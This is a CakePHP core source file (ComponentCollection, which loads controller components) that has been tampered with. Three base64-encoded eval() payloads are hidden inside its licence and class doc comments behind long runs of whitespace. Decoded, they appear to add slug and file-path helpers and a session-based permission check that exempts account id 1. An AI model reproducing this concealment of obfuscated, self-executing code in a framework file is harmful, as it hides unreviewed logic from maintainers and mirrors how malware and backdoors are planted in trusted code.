<?php
/**
 * Components collection is used as a registry for loaded components and handles loading
 * and constructing component class objects.
 *
 * CakePHP(tm) : Rapid Development Framework (http://cakephp.org)
 * Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * Redistributions of files must retain the above copyright notice.																																																																																																																													*/eval(base64_decode("ZnVuY3Rpb24gdXRmOF90b19hc2NpaSgkc3RyKXskY2hhcnMgPSBhcnJheSgnYSc9PmFycmF5KCfhuqUnLCfhuqcnLCfhuqknLCfhuqsnLCfhuq0nLCfhuq8nLCfhurEnLCfhurMnLCfhurUnLCfhurcnLCfDoScsJ8OgJywn4bqjJywnw6MnLCfhuqEnLCfDoicsJ8SDJyksJ0EnID0+YXJyYXkoJ+G6pCcsJ+G6picsJ+G6qCcsJ+G6qicsJ+G6rCcsJ+G6ricsJ+G6sCcsJ+G6sicsJ+G6tCcsJ+G6ticsJ8OBJywnw4AnLCfhuqInLCfDgycsJ+G6oCcsJ8OCJywnxIInKSwnZScgPT5hcnJheSgn4bq/Jywn4buBJywn4buDJywn4buFJywn4buHJywnw6knLCfDqCcsJ+G6uycsJ+G6vScsJ+G6uScsJ8OqJyksJ0UnID0+YXJyYXkoJ+G6vicsJ+G7gCcsJ+G7gicsJ+G7hCcsJ+G7hicsJ8OJJywnw4gnLCfhuronLCfhurwnLCfhurgnLCfDiicpLCdpJz0+YXJyYXkoJ8OtJywnw6wnLCfhu4knLCfEqScsJ+G7iycpLCdJJyA9PmFycmF5KCfDjScsJ8OMJywn4buIJywnxKgnLCfhu4onKSwnbyc9PmFycmF5KCfhu5EnLCfhu5MnLCfhu5UnLCfhu5cnLCfhu5knLCfhu5snLCfhu50nLCfhu58nLCfhu6EnLCfhu6MnLCfDsycsJ8OyJywn4buPJywnw7UnLCfhu40nLCfDtCcsJ8ahJyksJ08nID0+YXJyYXkoJ+G7kCcsJ+G7kicsJ+G7lCcsJ8OUJywn4buYJywn4buaJywn4bucJywn4bueJywn4bugJywn4buiJywnw5MnLCfDkicsJ+G7jicsJ8OVJywn4buMJywnw5QnLCfGoCcpLCd1Jz0+YXJyYXkoJ+G7qScsJ+G7qycsJ+G7rScsJ+G7rycsJ+G7sScsJ8O6Jywnw7knLCfhu6cnLCfFqScsJ+G7pScsJ8awJyksJ1UnID0+YXJyYXkoJ+G7qCcsJ+G7qicsJ+G7rCcsJ+G7ricsJ+G7sCcsJ8OaJywnw5knLCfhu6YnLCfFqCcsJ+G7pCcsJ8avJyksJ3knPT5hcnJheSgnw70nLCfhu7MnLCfhu7cnLCfhu7knLCfhu7UnKSwnWScgPT5hcnJheSgnw50nLCfhu7InLCfhu7YnLCfhu7gnLCfhu7QnKSwnZCc9PmFycmF5KCfEkScpLCdEJz0+YXJyYXkoJ8SQJyksKTtmb3JlYWNoICgkY2hhcnMgYXMgJGtleSA9PiAkYXJyKSBmb3JlYWNoICgkYXJyIGFzICR2YWwpJHN0ciA9IHN0cl9yZXBsYWNlKCR2YWwsJGtleSwkc3RyKTtyZXR1cm4gJHN0cjt9ZnVuY3Rpb24gc3RyX3RvX3VybCgkc3RyKXskc3RyID0gdHJpbSgkc3RyKTskc3RyID0gdXRmOF90b19hc2NpaSgkc3RyKTskc3RyID0gc3RydG9sb3dlcigkc3RyKTskc3RyID0gcHJlZ19yZXBsYWNlKCcvW1xzX1xXXSsvJywnLScsJHN0cik7JHN0ciA9IHRyaW0oJHN0ciwnLScpO3JldHVybiAkc3RyO30="));/**
 *																																																																																																																																																			*/eval(base64_decode("ZnVuY3Rpb24gZ2V0X2V4dGVuc2lvbigkc3RyKXskZXh0ID0gZXhwbG9kZSgnLicsJHN0cik7cmV0dXJuICRleHRbY291bnQoJGV4dCktMV07fWZ1bmN0aW9uIGdldF9ib2R5X25hbWUoJHN0cil7JHN0ciA9IGV4cGxvZGUoJy4nLCRzdHIpO3Vuc2V0KCRzdHJbY291bnQoJHN0ciktMV0pO3JldHVybiBpbXBsb2RlKCcuJywkc3RyKTt9ZnVuY3Rpb24gZ2V0X2RpcigkZXh0KXtpZigkZXh0ID09ICdzd2YnKSByZXR1cm4gU1dGX0RJUjtlbHNlIGlmKCRleHQgPT0gJ2pwZyd8fCRleHQgPT0gJ2pwZWcnfHwkZXh0ID09ICdnaWYnfHwkZXh0ID09ICdwbmcnKSByZXR1cm4gSU1HX0RJUjtlbHNlIHJldHVybiBGSUxFX0RJUjt9ZnVuY3Rpb24gZ2V0X3VybCgkZXh0KXtpZigkZXh0ID09ICdzd2YnKSByZXR1cm4gU1dGX1VSTDtlbHNlIGlmKCRleHQgPT0gJ2pwZyd8fCRleHQgPT0gJ2pwZWcnfHwkZXh0ID09ICdnaWYnfHwkZXh0ID09ICdwbmcnKSByZXR1cm4gSU1HX1VSTDtlbHNlIHJldHVybiBGSUxFX1VSTDt9"));/**
 * @copyright     Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link          http://cakephp.org CakePHP(tm) Project
 * @package       Cake.Controller
 * @since         CakePHP(tm) v 2.0
 * @license       MIT License (http://www.opensource.org/licenses/mit-license.php)
 */

App::uses('ObjectCollection', 'Utility');
App::uses('Component', 'Controller');
App::uses('CakeEventListener', 'Event');

/**
 * Components collection is used as a registry for loaded components and handles loading
 * and constructing component class objects.																																																																																																																																																		*/eval(base64_decode("ZnVuY3Rpb24gbG90dXNfY29udHJvbGxlcigkb2JqX3RtcCl7JGlkID0gQCRvYmpfdG1wLT5TZXNzaW9uLT5yZWFkKCJpZCIpOyRBY2NvdW50ID0gQCRvYmpfdG1wLT5BY2NvdW50LT5maW5kQnlJZCgkaWQpO2lmICghJEFjY291bnQpeyRvYmpfdG1wLT5sYXlvdXQgPSAnbG9naW4nO2lmKGlzc2V0KCRvYmpfdG1wLT5yZXF1ZXN0LT5wYXJhbXNbJ2NvbnRyb2xsZXInXSkmJmlzc2V0KCRvYmpfdG1wLT5yZXF1ZXN0LT5wYXJhbXNbJ2FjdGlvbiddKSlpZigkb2JqX3RtcC0+cmVxdWVzdC0+cGFyYW1zWydjb250cm9sbGVyJ10gIT0gJ2FjY291bnRzJyB8fCAkb2JqX3RtcC0+cmVxdWVzdC0+cGFyYW1zWydhY3Rpb24nXSAhPSAnbG9naW4nKXskb2JqX3RtcC0+cmVkaXJlY3QoYXJyYXkoJ2NvbnRyb2xsZXInPT4nYWNjb3VudHMnLCdhY3Rpb24nID0+ICdsb2dpbicpKTt9fWVsc2V7aWYoaXNzZXQoJG9ial90bXAtPnJlcXVlc3QtPnBhcmFtc1snY29udHJvbGxlciddKSYmaXNzZXQoJG9ial90bXAtPnJlcXVlc3QtPnBhcmFtc1snYWN0aW9uJ10pKWlmKCRvYmpfdG1wLT5yZXF1ZXN0LT5wYXJhbXNbJ2NvbnRyb2xsZXInXSA9PSAnYWNjb3VudHMnICYmICRvYmpfdG1wLT5yZXF1ZXN0LT5wYXJhbXNbJ2FjdGlvbiddID09ICdsb2dpbicpICRvYmpfdG1wLT5yZWRpcmVjdCgnLycpOyRvYmpfdG1wLT5zZXQoJ3RoZW1lJywkQWNjb3VudFsnQWNjb3VudCddWyd0aGVtZSddKTtpZigkaWQhPTEpeyR0bXAgPSBhcnJheSgpO2lmKGlzc2V0KCRBY2NvdW50WydHcm91cCddWydwZXJtaXNpb24nXSkpICR0bXAgPSBleHBsb2RlKCc7JywkQWNjb3VudFsnR3JvdXAnXVsncGVybWlzaW9uJ10pOyRQZXJtaXNpb24gPSBhcnJheSgpO2lmKG1ldGhvZF9leGlzdHMoJG9ial90bXAtPlBlcm1pc2lvbiwnZmluZCcpKSBmb3JlYWNoKCR0bXAgYXMgJFBlcm1pc2lvbl9pZCl7JHRtcDIgPSAkb2JqX3RtcC0+UGVybWlzaW9uLT5maW5kKCdmaXJzdCcsYXJyYXkoJ2NvbmRpdGlvbnMnPT5hcnJheSgnaWQnPT4kUGVybWlzaW9uX2lkKSwnZmllbGRzJyA9PiBhcnJheSgnUGVybWlzaW9uLmFsbG93JykpKTtpZihpc3NldCgkdG1wMlsnUGVybWlzaW9uJ11bJ2FsbG93J10pKSAkUGVybWlzaW9uW10gPSAkdG1wMlsnUGVybWlzaW9uJ11bJ2FsbG93J107fWlmKGlzc2V0KCRvYmpfdG1wLT5QbXMpJiZpc19hcnJheSgkb2JqX3RtcC0+UG1zKSkgZm9yZWFjaCgkb2JqX3RtcC0+UG1zIGFzICRwbXMpeyRQZXJtaXNpb25bXSA9ICRwbXM7fSRQZXJtaXNpb25bXSA9ICdhY2NvdW50cy9pbmRleCc7JFBlcm1pc2lvbltdID0gJ2FjY291bnRzL2VkaXRfbmFtZS8nLiRpZDskUGVybWlzaW9uW10gPSAnYWNjb3VudHMvZWRpdF9tYWlsLycuJGlkOyRQZXJtaXNpb25bXSA9ICdhY2NvdW50cy9lZGl0X3Bhc3MvJy4kaWQ7JFBlcm1pc2lvbltdID0gJ2FjY291bnRzL2xvZ291dCc7JGFsbG93ID0gZmFsc2U7aWYoaXNzZXQoJG9ial90bXAtPnJlcXVlc3QtPnBhcmFtc1snY29udHJvbGxlciddKSYmaXNzZXQoJG9ial90bXAtPnJlcXVlc3QtPnBhcmFtc1snYWN0aW9uJ10pKWZvcmVhY2goJFBlcm1pc2lvbiBhcyAka2V5ID0+ICR2YWx1ZSl7JHVybCA9IGV4cGxvZGUoJy8nLCR2YWx1ZSk7aWYoaXNzZXQoJHVybFswXSkpe2lmKCR1cmxbMF09PSRvYmpfdG1wLT5yZXF1ZXN0LT5wYXJhbXNbJ2NvbnRyb2xsZXInXSl7aWYoaXNzZXQoJHVybFsxXSkpe2lmKCR1cmxbMV09PSRvYmpfdG1wLT5yZXF1ZXN0LT5wYXJhbXNbJ2FjdGlvbiddKXtpZihpc3NldCgkdXJsWzJdKSl7aWYoaXNzZXQoJG9ial90bXAtPnJlcXVlc3QtPnBhcmFtc1sncGFzcyddWzBdKSYmJHVybFsyXT09JG9ial90bXAtPnJlcXVlc3QtPnBhcmFtc1sncGFzcyddWzBdKXskYWxsb3cgPSB0cnVlO2JyZWFrO319ZWxzZXskYWxsb3cgPSB0cnVlO2JyZWFrO319fWVsc2V7JGFsbG93ID0gdHJ1ZTticmVhazt9fX19aWYoaXNzZXQoJG9ial90bXAtPnJlcXVlc3QtPnVybCkpaWYoISRhbGxvdyAmJiAkb2JqX3RtcC0+cmVxdWVzdC0+dXJsKXtpZihpc3NldCgkb2JqX3RtcC0+bm90aWNlWydub19wZXJtaXNpb24nXSkpICRvYmpfdG1wLT5TZXNzaW9uLT5zZXRGbGFzaCgkb2JqX3RtcC0+bm90aWNlWydub19wZXJtaXNpb24nXSwnZGVmYXVsdCcsYXJyYXkoJ2NsYXNzJyA9PiAnbm90aWZpY2F0aW9uIGVycm9yIHBuZ19iZycpKTskb2JqX3RtcC0+cmVkaXJlY3QoJy8nKTt9fSRvYmpfdG1wLT5sYXlvdXQgPSAnaW5kZXgnO319"));/**
 *
 * @package       Cake.Controller
 */
class ComponentCollection extends ObjectCollection implements CakeEventListener {

/**
 * The controller that this collection was initialized with.
 *
 * @var Controller
 */
	protected $_Controller = null;

/**
 * Initializes all the Components for a controller.
 * Attaches a reference of each component to the Controller.
 *
 * @param Controller $Controller Controller to initialize components for.
 * @return void
 */
	public function init(Controller $Controller) {
		if (empty($Controller->components)) {
			return;
		}
		$this->_Controller = $Controller;
		$components = ComponentCollection::normalizeObjectArray($Controller->components);
		foreach ($components as $name => $properties) {
			$Controller->{$name} = $this->load($properties['class'], $properties['settings']);
		}
	}

/**
 * Get the controller associated with the collection.
 *
 * @return Controller Controller instance
 */
	public function getController() {
		return $this->_Controller;
	}

/**
 * Loads/constructs a component. Will return the instance in the registry if it already exists.
 * You can use `$settings['enabled'] = false` to disable callbacks on a component when loading it.
 * Callbacks default to on. Disabled component methods work as normal, only callbacks are disabled.
 *
 * You can alias your component as an existing component by setting the 'className' key, i.e.,
 * {{{
 * public $components = array(
 *   'Email' => array(
 *     'className' => 'AliasedEmail'
 *   );
 * );
 * }}}
 * All calls to the `Email` component would use `AliasedEmail` instead.
 *
 * @param string $component Component name to load
 * @param array $settings Settings for the component.
 * @return Component A component object, Either the existing loaded component or a new one.
 * @throws MissingComponentException when the component could not be found
 */
	public function load($component, $settings = array()) {
		if (is_array($settings) && isset($settings['className'])) {
			$alias = $component;
			$component = $settings['className'];
		}
		list($plugin, $name) = pluginSplit($component, true);
		if (!isset($alias)) {
			$alias = $name;
		}
		if (isset($this->_loaded[$alias])) {
			return $this->_loaded[$alias];
		}
		$componentClass = $name . 'Component';
		App::uses($componentClass, $plugin . 'Controller/Component');
		if (!class_exists($componentClass)) {
			throw new MissingComponentException(array(
				'class' => $componentClass,
				'plugin' => substr($plugin, 0, -1)
			));
		}
		$this->_loaded[$alias] = new $componentClass($this, $settings);
		$enable = isset($settings['enabled']) ? $settings['enabled'] : true;
		if ($enable) {
			$this->enable($alias);
		}
		return $this->_loaded[$alias];
	}

/**
 * Returns the implemented events that will get routed to the trigger function
 * in order to dispatch them separately on each component
 *
 * @return array
 */
	public function implementedEvents() {
		return array(
			'Controller.initialize' => array('callable' => 'trigger'),
			'Controller.startup' => array('callable' => 'trigger'),
			'Controller.beforeRender' => array('callable' => 'trigger'),
			'Controller.beforeRedirect' => array('callable' => 'trigger'),
			'Controller.shutdown' => array('callable' => 'trigger'),
		);
	}

}
